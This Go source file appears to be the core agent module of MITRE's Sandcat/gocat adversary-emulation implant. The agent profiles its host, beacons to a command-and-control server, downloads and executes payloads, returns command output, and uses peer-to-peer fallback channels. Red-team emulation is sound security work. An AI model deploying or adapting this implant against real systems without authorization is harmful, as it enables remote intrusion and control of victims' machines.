package agent

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"sync"
	"time"

	"github.com/mitre/gocat/contact"
	"github.com/mitre/gocat/execute"
	"github.com/mitre/gocat/output"
	"github.com/mitre/gocat/privdetect"
	"github.com/mitre/gocat/proxy"
)

var beaconFailureThreshold = 3

type AgentInterface interface {
	Beacon() map[string]interface{}
	Initialize(server string, group string, c2Config map[string]string, enableLocalP2pReceivers bool) error
	RunInstruction(command map[string]interface{}, payloads []string, submitResults bool)
	Terminate()
	GetFullProfile() map[string]interface{}
	GetTrimmedProfile() map[string]interface{}
	SetPaw(paw string)
	Display()
	DownloadPayloads(payloads []interface{}) []string
	FetchPayloadBytes(payload string) []byte
	ActivateLocalP2pReceivers()
	TerminateLocalP2pReceivers()
	HandleBeaconFailure() error
	DiscoverPeers()
	CheckAndSetCommsChannel(server string, c2Protocol string, c2Key string) error
	GetCurrentContact() contact.Contact
	GetCurrentContactName() string
	MarkCurrCommsAsSuccessful()
	SetWatchdog(newVal int)
	UpdateCheckinTime(checkin time.Time)
	EvaluateWatchdog() bool
	SwitchC2Contact(newContactName string, newKey string) error
}

// Implements AgentInterface
type Agent struct {
	// Profile fields
	group string
	host string
	username string
	architecture string
	platform string
	location string
	pid int
	ppid int
	executors []string
	privilege string
	exe_name string
	paw string
	initialDelay float64
	originLinkID int
	watchdog int
	checkin time.Time

	// Communication-related info
	agentComms AgentCommsChannel
	validatedCommsChannels map[string]AgentCommsChannel // map "protocol-server" string to validated comms channel object.
	failedBeaconCounter int
	successfulCommsChannels []AgentCommsChannel // List of historically successful comms channels
	tryingSwitchedContact bool // true if agent is trying a different C2 contact
	successFulCommsChannelIndex int

	// peer-to-peer info
	enableLocalP2pReceivers bool
	p2pReceiverWaitGroup *sync.WaitGroup
	localP2pReceivers map[string]proxy.P2pReceiver // maps P2P protocol to receiver running on this machine
	localP2pReceiverAddresses map[string][]string // maps P2P protocol to receiver addresses listening on this machine
	availablePeerReceivers map[string][]string // maps P2P protocol to receiver addresses running on peer machines
	exhaustedPeerReceivers map[string][]string // maps P2P protocol to receiver addresses that the agent has tried using.

	// Deadman instructions to run before termination. Will be list of instruction mappings.
	deadmanInstructions []map[string]interface{}
}

// Set up agent variables.
func (a *Agent) Initialize(server string, group string, c2Config map[string]string, enableLocalP2pReceivers bool, initialDelay int, paw string, originLinkID int) error {
	host, err := os.Hostname()
	if err != nil {
		return err
	}
	if userName, err := getUsername(); err == nil {
		a.username = userName
	} else {
		return err
	}
	a.group = group
	a.host = host
	a.architecture = runtime.GOARCH
	a.platform = runtime.GOOS
	a.location = os.Args[0]
	a.pid = os.Getpid()
	a.ppid = os.Getppid()
	a.executors = execute.AvailableExecutors()
	a.privilege = privdetect.Privlevel()
	a.exe_name = filepath.Base(os.Args[0])
	a.initialDelay = float64(initialDelay)
	a.failedBeaconCounter = 0
	a.originLinkID = originLinkID
	a.successfulCommsChannels = make([]AgentCommsChannel, 0)
	a.validatedCommsChannels = map[string]AgentCommsChannel{}
	a.tryingSwitchedContact = true
	a.successFulCommsChannelIndex = 0
	a.watchdog = 0

	// Paw will get initialized after successful beacon if it's not specified via command line
	if paw != "" {
		a.paw = paw
	}

	// Load peer proxy receiver information
	a.exhaustedPeerReceivers = make(map[string][]string)
	a.availablePeerReceivers, err = proxy.GetAvailablePeerReceivers()
	if err != nil {
		return err
	}
	a.DiscoverPeers()

	// Set up initial agent comms. Resort to peer-to-peer if needed.
	if err = a.setInitialCommsChannel(server, c2Config); err != nil {
		// print error, fall back to proxy
		output.VerbosePrint(fmt.Sprintf("[!] Error attempting to set comms channel for %s via %s: %s", server, c2Config["c2Name"], err.Error()))
		output.VerbosePrint("[!] Requested communication channel not valid or available. Resorting to peer-to-peer.")
		if err = a.switchToFirstAvailablePeerProxyClient(); err != nil {
			output.VerbosePrint(fmt.Sprintf("[!] Error when finding available peer proxy client: %s", err.Error()))
			return errors.New("Unable to set requested initial comms channel and unable to find available peer proxy clients.")
		}
	}

	// Set up P2P receivers.
	a.enableLocalP2pReceivers = enableLocalP2pReceivers
	if a.enableLocalP2pReceivers {
		a.localP2pReceivers = make(map[string]proxy.P2pReceiver)
		a.localP2pReceiverAddresses = make(map[string][]string)
		a.p2pReceiverWaitGroup = &sync.WaitGroup{}
		a.ActivateLocalP2pReceivers()
	}
	return nil
}

// Returns full profile for agent.
func (a *Agent) GetFullProfile() map[string]interface{} {
	// TODO change how we get beacon contact name
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.getCurrentServerAddress(),
		"group": a.group,
		"host": a.host,
		"contact": a.GetCurrentContactName(),
		"username": a.username,
		"architecture": a.architecture,
		"platform": a.platform,
		"location": a.location,
		"pid": a.pid,
		"ppid": a.ppid,
		"executors": a.executors,
		"privilege": a.privilege,
		"exe_name": a.exe_name,
		"proxy_receivers": a.localP2pReceiverAddresses,
		"origin_link_id": a.originLinkID,
		"deadman_enabled": true,
		"available_contacts": contact.GetAvailableContactNames(),
	}
}

// Return minimal subset of agent profile.
func (a *Agent) GetTrimmedProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.getCurrentServerAddress(),
		"platform": a.platform,
		"host": a.host,
		"contact": a.GetCurrentContactName(),
	}
	// TODO change how we get beacon name
}

// Pings C2 for instructions and returns them.
func (a *Agent) Beacon() map[string]interface{} {
	var beacon map[string]interface{}
	profile := a.GetFullProfile()
	response := a.GetCurrentContact().GetBeaconBytes(profile)
	if response != nil {
		beacon = a.processBeacon(response)
	} else {
		output.VerbosePrint("[-] beacon: DEAD")
	}
	return beacon
}

// Converts the given data into a beacon with instructions.
func (a *Agent) processBeacon(data []byte) map[string]interface{} {
	var beacon map[string]interface{}
	if err := json.Unmarshal(data, &beacon); err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon received: %s", err.Error()))
	} else {
		var commands interface{}
		if err := json.Unmarshal([]byte(beacon["instructions"].(string)), &commands); err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon instructions received: %s", err.Error()))
		} else {
			output.VerbosePrint(fmt.Sprintf("[+] Beacon (%s): ALIVE", a.GetCurrentContactName()))
			beacon["sleep"] = int(beacon["sleep"].(float64))
			beacon["watchdog"] = int(beacon["watchdog"].(float64))
			beacon["instructions"] = commands
		}
	}
	return beacon
}

func (a *Agent) Terminate() {
	// Add any cleanup/termination functionality here.
	output.VerbosePrint("[*] Beginning agent termination.")
	if a.enableLocalP2pReceivers {
		a.TerminateLocalP2pReceivers()
	}

	// Run deadman instructions prior to termination
	a.ExecuteDeadmanInstructions()
	output.VerbosePrint("[*] Terminating Sandcat Agent... goodbye.")
}

// Runs a single instruction and send results.
func (a *Agent) RunInstruction(instruction map[string]interface{}, payloads []string, submitResults bool) {
	result := make(map[string]interface{})
	info := execute.InstructionInfo{
		Profile: a.GetTrimmedProfile(),
		Instruction: instruction,
	}
	commandOutput, status, pid := execute.RunCommand(info, payloads)
	for _, payloadPath := range payloads {
		err := os.Remove(payloadPath)
		if err != nil {
			output.VerbosePrint("[!] Failed to delete payload: " + payloadPath)
		}
	}
	if submitResults {
		result["id"] = instruction["id"]
		result["output"] = commandOutput
		result["status"] = status
		result["pid"] = pid
		output.VerbosePrint(fmt.Sprintf("[*] Submitting results for link %s via C2 channel %s", result["id"].(string), a.GetCurrentContactName()))
		a.GetCurrentContact().SendExecutionResults(a.GetTrimmedProfile(), result)
	}
}

// Outputs information about the agent.
func (a *Agent) Display() {
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", int(a.initialDelay)))
	output.VerbosePrint(fmt.Sprintf("server=%s", a.getCurrentServerAddress()))
	output.VerbosePrint(fmt.Sprintf("group=%s", a.group))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", a.privilege))
	output.VerbosePrint(fmt.Sprintf("allow local p2p receivers=%v", a.enableLocalP2pReceivers))
	output.VerbosePrint(fmt.Sprintf("contact channel=%s", a.GetCurrentContactName()))
	if a.enableLocalP2pReceivers {
		a.displayLocalReceiverInformation()
	}
}

func (a *Agent) displayLocalReceiverInformation() {
	for receiverName, _ := range proxy.P2pReceiverChannels {
		if _, ok := a.localP2pReceivers[receiverName]; ok {
			output.VerbosePrint(fmt.Sprintf("P2p receiver %s=activated", receiverName))
		} else {
			output.VerbosePrint(fmt.Sprintf("P2p receiver %s=NOT activated", receiverName))
		}
	}
	for protocol, addressList := range a.localP2pReceiverAddresses {
		for _, address := range addressList {
			output.VerbosePrint(fmt.Sprintf("%s local proxy receiver available at %s", protocol, address))
		}
	}
}

// Will download each individual payload listed, write them to disk,
// and will return the full file paths of each downloaded payload.
func (a *Agent) DownloadPayloads(payloads []interface{}) []string {
	var droppedPayloads []string
	availablePayloads := reflect.ValueOf(payloads)
	for i := 0; i < availablePayloads.Len(); i++ {
		payload := availablePayloads.Index(i).Elem().String()
		location, err := a.WritePayloadToDisk(payload)
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] %s", err.Error()))
			continue
		}
		droppedPayloads = append(droppedPayloads, location)
	}
	return droppedPayloads
}

// Will download the specified payload and write it to disk using the filename provided by the C2.
// Returns the C2-provided filename or error.
func (a *Agent) WritePayloadToDisk(payload string) (string, error) {
	payloadBytes, filename := a.FetchPayloadBytes(payload)
	if len(payloadBytes) > 0 && len(filename) > 0 {
		location := filepath.Join(filename)
		if !fileExists(location) {
			return location, writePayloadBytes(location, payloadBytes)
		}
		output.VerbosePrint(fmt.Sprintf("[*] File %s already exists", filename))
		return location, nil
	}
	return "", errors.New(fmt.Sprintf("Failed to fetch payload bytes for payload %s",payload))
}

// Will request payload bytes from the C2 for the specified payload and return them.
func (a *Agent) FetchPayloadBytes(payload string) ([]byte, string) {
	output.VerbosePrint(fmt.Sprintf("[*] Fetching new payload bytes via C2 channel %s: %s", a.GetCurrentContactName(), payload))
	return a.GetCurrentContact().GetPayloadBytes(a.GetTrimmedProfile(), payload)
}

func (a *Agent) Sleep(sleepTime float64) {
	time.Sleep(time.Duration(sleepTime) * time.Second)
}

func (a *Agent) GetPaw() string {
	return a.paw
}

func (a *Agent) SetPaw(paw string) {
	if len(paw) > 0 {
		a.paw = paw
		if a.enableLocalP2pReceivers {
			for _, receiver := range a.localP2pReceivers {
				receiver.UpdateAgentPaw(paw)
			}
		}
	}
}

func (a *Agent) StoreDeadmanInstruction(instruction map[string]interface{}) {
	a.deadmanInstructions = append(a.deadmanInstructions, instruction)
}

func (a *Agent) ExecuteDeadmanInstructions() {
	for _, instruction := range a.deadmanInstructions {
		output.VerbosePrint(fmt.Sprintf("[*] Running deadman instruction %s", instruction["id"]))
		droppedPayloads := a.DownloadPayloads(instruction["payloads"].([]interface{}))
		a.RunInstruction(instruction, droppedPayloads, false)
	}
}

func (a *Agent) modifyAgentConfiguration(config map[string]string) {
	if val, ok := config["paw"]; ok {
		a.SetPaw(val)
	}
}

func (a *Agent) SetWatchdog(newVal int) {
	if newVal <= 0 {
		a.watchdog = 0
	} else {
		a.watchdog = newVal
	}
}

func (a *Agent) UpdateCheckinTime(checkin time.Time) {
	a.checkin = checkin
}

// Returns true if agent should keep running, false if not.
func (a *Agent) EvaluateWatchdog() bool {
	return a.watchdog <= 0 || float64(time.Now().Sub(a.checkin).Seconds()) <= float64(a.watchdog)
}